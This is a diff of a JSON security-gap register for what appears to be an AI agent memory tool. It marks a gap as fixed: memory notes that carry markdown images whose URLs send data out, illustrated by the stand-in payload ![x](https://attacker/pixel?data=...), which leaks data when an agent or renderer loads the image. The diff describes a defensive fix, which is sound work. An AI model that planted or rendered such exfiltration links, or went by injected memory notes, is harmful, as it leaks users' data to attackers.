@@ -30,8 +30,9 @@
     "fixed_in": "1.6.0"
   },
   "GAP-POISON-MDLINK": {
-    "title": "Markdown image/link data-exfiltration payloads are not flagged",
-    "summary": "The write-time linter looks for prompt-injection instructions and secrets, but not for markdown images or links whose URL smuggles data out (for example ![x](https://attacker/pixel?data=...)). A renderer or agent that auto-loads the image leaks the data. Such a note is stored as ordinary memory. Suggested fix: add a linter pattern (injection category) for markdown images/links whose URL host is off-allowlist and whose query or path carries note-derived data, and treat it like other injection findings (quarantine by default). The read-side untrusted-data banner already warns the agent, so this is defense-in-depth, not the only line.",
-    "status": "roadmap"
+    "title": "Markdown image data-exfiltration payloads are not flagged",
+    "summary": "Fixed in 2.0.0: the write-time linter holds a note in quarantine when it carries a markdown image (it loads by itself when rendered) pointing at a remote address with a query string, such as ![x](https://attacker/pixel?data=...). README badge hosts (img.shields.io, badgen.net, badge.fury.io, codecov.io) are exempt. Plain links need a click and are not flagged.",
+    "status": "fixed",
+    "fixed_in": "2.0.0"
   }
 }
